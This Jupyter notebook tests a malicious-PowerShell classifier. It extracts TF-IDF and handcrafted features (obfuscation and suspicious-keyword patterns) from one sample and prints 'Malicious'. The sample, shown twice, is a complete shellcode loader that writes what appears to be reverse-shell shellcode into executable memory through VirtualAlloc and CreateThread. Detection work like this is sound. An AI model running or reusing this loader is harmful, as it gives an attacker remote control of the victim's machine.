{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "01fff1b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "import math\n",
    "import re\n",
    "from collections import Counter\n",
    "import pandas as pd\n",
    "import pickle\n",
    "from sklearn.feature_extraction.text import TfidfVectorizer\n",
    "from sklearn.feature_selection import SelectKBest"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "9c5fdc01",
   "metadata": {},
   "outputs": [],
   "source": [
    "new_instance_script = \"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x31,0x31,0xc5,0x58,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "731640c2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'$c = \\'[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);\\';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x31,0x31,0xc5,0x58,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "new_instance_script"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "467f9765",
   "metadata": {},
   "outputs": [],
   "source": [
    "def clean_script(script):\n",
    "    # Remove comments from the script\n",
    "    script = re.sub(r'#.*$', ' ', script, flags=re.MULTILINE)\n",
    "    \n",
    "    # Remove special characters and reduce consecutive spaces\n",
    "    cleaned_script = re.sub(r'\\s+', ' ', script)\n",
    "    \n",
    "    # Remove tabs and newlines\n",
    "    cleaned_script = cleaned_script.replace('\\t', ' ').replace('\\n', ' ')\n",
    "    \n",
    "    # Remove punctuation\n",
    "    cleaned_script = re.sub(r'[^\\w\\s]', ' ', cleaned_script).lower()\n",
    "    \n",
    "    return cleaned_script"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "8c50558e",
   "metadata": {},
   "outputs": [],
   "source": [
    "clean = clean_script(new_instance_script)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "0f2e19dd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' c     dllimport  kernel32 dll   public static extern intptr virtualalloc intptr lpaddress  uint dwsize  uint flallocationtype  uint flprotect   dllimport  kernel32 dll   public static extern intptr createthread intptr lpthreadattributes  uint dwstacksize  intptr lpstartaddress  intptr lpparameter  uint dwcreationflags  intptr lpthreadid   dllimport  msvcrt dll   public static extern intptr memset intptr dest  uint src  uint count     w   add type  memberdefinition  c  name  win32   namespace win32functions  passthru  byte     byte    z   0xfc 0xe8 0x82 0x00 0x00 0x00 0x60 0x89 0xe5 0x31 0xc0 0x64 0x8b 0x50 0x30 0x8b 0x52 0x0c 0x8b 0x52 0x14 0x8b 0x72 0x28 0x0f 0xb7 0x4a 0x26 0x31 0xff 0xac 0x3c 0x61 0x7c 0x02 0x2c 0x20 0xc1 0xcf 0x0d 0x01 0xc7 0xe2 0xf2 0x52 0x57 0x8b 0x52 0x10 0x8b 0x4a 0x3c 0x8b 0x4c 0x11 0x78 0xe3 0x48 0x01 0xd1 0x51 0x8b 0x59 0x20 0x01 0xd3 0x8b 0x49 0x18 0xe3 0x3a 0x49 0x8b 0x34 0x8b 0x01 0xd6 0x31 0xff 0xac 0xc1 0xcf 0x0d 0x01 0xc7 0x38 0xe0 0x75 0xf6 0x03 0x7d 0xf8 0x3b 0x7d 0x24 0x75 0xe4 0x58 0x8b 0x58 0x24 0x01 0xd3 0x66 0x8b 0x0c 0x4b 0x8b 0x58 0x1c 0x01 0xd3 0x8b 0x04 0x8b 0x01 0xd0 0x89 0x44 0x24 0x24 0x5b 0x5b 0x61 0x59 0x5a 0x51 0xff 0xe0 0x5f 0x5f 0x5a 0x8b 0x12 0xeb 0x8d 0x5d 0x68 0x33 0x32 0x00 0x00 0x68 0x77 0x73 0x32 0x5f 0x54 0x68 0x4c 0x77 0x26 0x07 0xff 0xd5 0xb8 0x90 0x01 0x00 0x00 0x29 0xc4 0x54 0x50 0x68 0x29 0x80 0x6b 0x00 0xff 0xd5 0x6a 0x05 0x68 0x31 0x31 0xc5 0x58 0x68 0x02 0x00 0x01 0xbb 0x89 0xe6 0x50 0x50 0x50 0x50 0x40 0x50 0x40 0x50 0x68 0xea 0x0f 0xdf 0xe0 0xff 0xd5 0x97 0x6a 0x10 0x56 0x57 0x68 0x99 0xa5 0x74 0x61 0xff 0xd5 0x85 0xc0 0x74 0x0a 0xff 0x4e 0x08 0x75 0xec 0xe8 0x61 0x00 0x00 0x00 0x6a 0x00 0x6a 0x04 0x56 0x57 0x68 0x02 0xd9 0xc8 0x5f 0xff 0xd5 0x83 0xf8 0x00 0x7e 0x36 0x8b 0x36 0x6a 0x40 0x68 0x00 0x10 0x00 0x00 0x56 0x6a 0x00 0x68 0x58 0xa4 0x53 0xe5 0xff 0xd5 0x93 0x53 0x6a 0x00 0x56 0x53 0x57 0x68 0x02 0xd9 0xc8 0x5f 0xff 0xd5 0x83 0xf8 0x00 0x7d 0x22 0x58 0x68 0x00 0x40 0x00 0x00 0x6a 0x00 0x50 0x68 0x0b 0x2f 0x0f 0x30 0xff 0xd5 0x57 0x68 0x75 0x6e 0x4d 0x61 0xff 0xd5 0x5e 0x5e 0xff 0x0c 0x24 0xe9 0x71 0xff 0xff 0xff 0x01 0xc3 0x29 0xc6 0x75 0xc7 0xc3 0xbb 0xf0 0xb5 0xa2 0x56 0x6a 0x00 0x53 0xff 0xd5  g   0x1000 if   z length  gt 0x1000   g    z length   x  w  virtualalloc 0 0x1000  g 0x40  for   i 0  i  le   z length 1   i      w  memset  intptr   x toint32    i    z  i   1    w  createthread 0 0  x 0 0 0  for      start sleep 60  '"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "clean"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "9fa2da7a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "import pandas as pd\n",
    "from sklearn.feature_extraction.text import TfidfVectorizer\n",
    "from sklearn.feature_selection import SelectKBest\n",
    "\n",
    "# Load the TF-IDF vectorizer\n",
    "with open('vectorizer.pkl', 'rb') as file:\n",
    "    vectorizer = pickle.load(file)\n",
    "\n",
    "# Load the SelectKBest instance\n",
    "with open('selector.pkl', 'rb') as file:\n",
    "    selector = pickle.load(file)\n",
    "\n",
    "# Load the selected feature names DataFrame\n",
    "X_selected_df = pd.read_pickle('selected_features.pkl')\n",
    "\n",
    "# Assuming 'new_data' contains your new data\n",
    "# Apply the TF-IDF vectorizer to the new data\n",
    "X_tfidf = vectorizer.transform([clean])\n",
    "\n",
    "# Apply the loaded SelectKBest instance to the TF-IDF transformed data\n",
    "X_new_selected = selector.transform(X_tfidf)\n",
    "\n",
    "# Convert the selected features to a DataFrame using the previously selected feature names\n",
    "X_new_selected_df = pd.DataFrame(X_new_selected.toarray(), columns=X_selected_df.columns)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "1d3f0e46",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0x00</th>\n",
       "      <th>0x00 0x00</th>\n",
       "      <th>0x00 0x00 0x00</th>\n",
       "      <th>0x00 0x00 0x60</th>\n",
       "      <th>0x00 0x00 0x68</th>\n",
       "      <th>0x00 0x10</th>\n",
       "      <th>0x00 0x10 0x00</th>\n",
       "      <th>0x00 0x56</th>\n",
       "      <th>0x00 0x60</th>\n",
       "      <th>0x00 0x60 0x89</th>\n",
       "      <th>...</th>\n",
       "      <th>wow64 trident</th>\n",
       "      <th>wow64 trident rv</th>\n",
       "      <th>write</th>\n",
       "      <th>write error</th>\n",
       "      <th>write host</th>\n",
       "      <th>write verbose</th>\n",
       "      <th>write verbose message</th>\n",
       "      <th>yahoo</th>\n",
       "      <th>yahoo csrsv</th>\n",
       "      <th>yahoo csrsv exe</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0.36621</td>\n",
       "      <td>0.133587</td>\n",
       "      <td>0.033483</td>\n",
       "      <td>0.016746</td>\n",
       "      <td>0.016746</td>\n",
       "      <td>0.016741</td>\n",
       "      <td>0.016746</td>\n",
       "      <td>0.033863</td>\n",
       "      <td>0.016732</td>\n",
       "      <td>0.016746</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>1 rows × 1000 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "      0x00  0x00 0x00  0x00 0x00 0x00  0x00 0x00 0x60  0x00 0x00 0x68  \\\n",
       "0  0.36621   0.133587        0.033483        0.016746        0.016746   \n",
       "\n",
       "   0x00 0x10  0x00 0x10 0x00  0x00 0x56  0x00 0x60  0x00 0x60 0x89  ...  \\\n",
       "0   0.016741        0.016746   0.033863   0.016732        0.016746  ...   \n",
       "\n",
       "   wow64 trident  wow64 trident rv  write  write error  write host  \\\n",
       "0            0.0               0.0    0.0          0.0         0.0   \n",
       "\n",
       "   write verbose  write verbose message  yahoo  yahoo csrsv  yahoo csrsv exe  \n",
       "0            0.0                    0.0    0.0          0.0              0.0  \n",
       "\n",
       "[1 rows x 1000 columns]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_new_selected_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "153c8df2",
   "metadata": {},
   "outputs": [],
   "source": [
    "import math\n",
    "import re\n",
    "from collections import Counter\n",
    "import pandas as pd\n",
    "\n",
    "# Function definitions (copied from your training notebook)\n",
    "def text_length(script):\n",
    "    return len(script)\n",
    "\n",
    "def entropy(script):\n",
    "    character_counts = Counter(script)\n",
    "    total_characters = len(script)\n",
    "    probabilities = [count / total_characters for count in character_counts.values()]\n",
    "    entropy_value = -sum(probability * math.log2(probability) for probability in probabilities)\n",
    "    return entropy_value\n",
    "\n",
    "def punctuation_count(script):\n",
    "    return len(re.findall(r'[^\\w\\s]', script))\n",
    "\n",
    "def function_count(script):\n",
    "    function_keywords = ['function', 'procedure']\n",
    "    return sum(script.count(keyword) for keyword in function_keywords)\n",
    "\n",
    "def numeric_literal_count(script):\n",
    "    return len(re.findall(r'\\b\\d+\\b', script))\n",
    "\n",
    "def string_literal_count(script):\n",
    "    return len(re.findall(r'\"([^\"]*)\"', script))\n",
    "\n",
    "def has_error_handling(script):\n",
    "    error_handling_keywords = ['try', 'except', 'catch']\n",
    "    return any(keyword in script for keyword in error_handling_keywords)\n",
    "\n",
    "def has_urls_or_ips(script):\n",
    "    return bool(re.search(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\\\(\\\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+|\\d+\\.\\d+\\.\\d+\\.\\d+', script))\n",
    "\n",
    "def has_obfuscation_indicators(script):\n",
    "    obfuscation_patterns = [\n",
    "        r'\\b(?:\\w+\\s*\\+\\s*\\w+)',\n",
    "        r'\\b(?:[a-zA-Z]\\s*=\\s*[^;]*\\bchr\\s*\\(\\s*\\w+\\s*\\+\\s*\\d+\\s*\\)\\s*;\\s*)+',\n",
    "        r'0x[\\da-fA-F]+',\n",
    "        r'(?:\\\\x[0-9a-fA-F]{2}|\\\\u[0-9a-fA-F]{4}|\\\\U[0-9a-fA-F]{8})',\n",
    "        r'\\b(?:Add-Type|dllimport|virtualalloc|createthread|memset)\\b',\n",
    "        r'\\b(?:eval|exec|decode|encode|obfuscate)\\b'\n",
    "    ]\n",
    "    return any(re.search(pattern, script) for pattern in obfuscation_patterns)\n",
    "\n",
    "def has_suspicious_words(script):\n",
    "    disclosure_keywords = ['downloadfile','password', 'secret', 'key', 'token', 'downloadstring',\n",
    "                          'dllimport', 'programdata', 'new object', 'appdata']\n",
    "    return any(keyword in script for keyword in disclosure_keywords)\n",
    "\n",
    "def longest_string_length(script):\n",
    "    string_literals = re.findall(r'\"([^\"]*)\"', script)\n",
    "    if not string_literals:\n",
    "        return 0\n",
    "    longest_length = max(len(string_literal) for string_literal in string_literals)\n",
    "    return longest_length\n",
    "\n",
    "\n",
    "length = text_length(clean)\n",
    "ent = entropy(new_instance_script)\n",
    "punc_count = punctuation_count(new_instance_script)\n",
    "func_count = function_count(clean)\n",
    "num_lit_count = numeric_literal_count(clean)\n",
    "str_lit_count = string_literal_count(new_instance_script)\n",
    "err_handling = has_error_handling(clean)\n",
    "urls_ips = has_urls_or_ips(new_instance_script)\n",
    "obf_indicators = has_obfuscation_indicators(clean)\n",
    "suspicious_words = has_suspicious_words(clean)\n",
    "longest_str_length = longest_string_length(new_instance_script)\n",
    "\n",
    "# Create a DataFrame with the extracted features\n",
    "new_features = pd.DataFrame({\n",
    "    'text_length': [length],\n",
    "    'function_count': [func_count],\n",
    "    'numeric_literal_count': [num_lit_count],\n",
    "    'has_error_handling': [int(err_handling)], \n",
    "    'has_obfuscation_indicators': [int(obf_indicators)],\n",
    "    'has_suspicious_words': [int(suspicious_words)],  \n",
    "    \n",
    "    'Entropy': [ent],\n",
    "    'punctuation_count': [punc_count],\n",
    "    'longest_string_length': [longest_str_length],\n",
    "    'string_literal_count': [str_lit_count],\n",
    "    'has_urls_or_ips': [int(urls_ips)]       \n",
    "})\n",
    "\n",
    "# Concatenate the new features DataFrame with the existing DataFrame containing selected features\n",
    "X_new_selected_df_with_features = pd.concat([X_new_selected_df, new_features], axis=1)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "3a82e4b5",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Index(['text_length', 'function_count', 'numeric_literal_count',\n",
    "#        'has_error_handling', 'has_obfuscation_indicators',\n",
    "#        'has_suspicious_words', 'Entropy', 'punctuation_count',\n",
    "#        'longest_string_length', 'string_literal_count', 'has_urls_or_ips'],\n",
    "#       dtype='object')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "094798b8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0x00</th>\n",
       "      <th>0x00 0x00</th>\n",
       "      <th>0x00 0x00 0x00</th>\n",
       "      <th>0x00 0x00 0x60</th>\n",
       "      <th>0x00 0x00 0x68</th>\n",
       "      <th>0x00 0x10</th>\n",
       "      <th>0x00 0x10 0x00</th>\n",
       "      <th>0x00 0x56</th>\n",
       "      <th>0x00 0x60</th>\n",
       "      <th>0x00 0x60 0x89</th>\n",
       "      <th>...</th>\n",
       "      <th>function_count</th>\n",
       "      <th>numeric_literal_count</th>\n",
       "      <th>has_error_handling</th>\n",
       "      <th>has_obfuscation_indicators</th>\n",
       "      <th>has_suspicious_words</th>\n",
       "      <th>Entropy</th>\n",
       "      <th>punctuation_count</th>\n",
       "      <th>longest_string_length</th>\n",
       "      <th>string_literal_count</th>\n",
       "      <th>has_urls_or_ips</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0.36621</td>\n",
       "      <td>0.133587</td>\n",
       "      <td>0.033483</td>\n",
       "      <td>0.016746</td>\n",
       "      <td>0.016746</td>\n",
       "      <td>0.016741</td>\n",
       "      <td>0.016746</td>\n",
       "      <td>0.033863</td>\n",
       "      <td>0.016732</td>\n",
       "      <td>0.016746</td>\n",
       "      <td>...</td>\n",
       "      <td>1</td>\n",
       "      <td>10</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>4.520379</td>\n",
       "      <td>487</td>\n",
       "      <td>12</td>\n",
       "      <td>4</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>1 rows × 1011 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "      0x00  0x00 0x00  0x00 0x00 0x00  0x00 0x00 0x60  0x00 0x00 0x68  \\\n",
       "0  0.36621   0.133587        0.033483        0.016746        0.016746   \n",
       "\n",
       "   0x00 0x10  0x00 0x10 0x00  0x00 0x56  0x00 0x60  0x00 0x60 0x89  ...  \\\n",
       "0   0.016741        0.016746   0.033863   0.016732        0.016746  ...   \n",
       "\n",
       "   function_count  numeric_literal_count  has_error_handling  \\\n",
       "0               1                     10                   0   \n",
       "\n",
       "   has_obfuscation_indicators  has_suspicious_words   Entropy  \\\n",
       "0                           1                     1  4.520379   \n",
       "\n",
       "   punctuation_count  longest_string_length  string_literal_count  \\\n",
       "0                487                     12                     4   \n",
       "\n",
       "   has_urls_or_ips  \n",
       "0                0  \n",
       "\n",
       "[1 rows x 1011 columns]"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_new_selected_df_with_features\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "6590fa4c",
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "# Load the trained model\n",
    "with open('model.pkl', 'rb') as file:\n",
    "    model = pickle.load(file)\n",
    "\n",
    "# Use the model to make predictions\n",
    "predicted_label = model.predict(X_new_selected_df_with_features)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "36ef17e4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Malicious\n"
     ]
    }
   ],
   "source": [
    "if predicted_label[0] == 0:\n",
    "    print(\"Malicious\")\n",
    "else:\n",
    "    print(\"Benign\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37b4d3d7",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
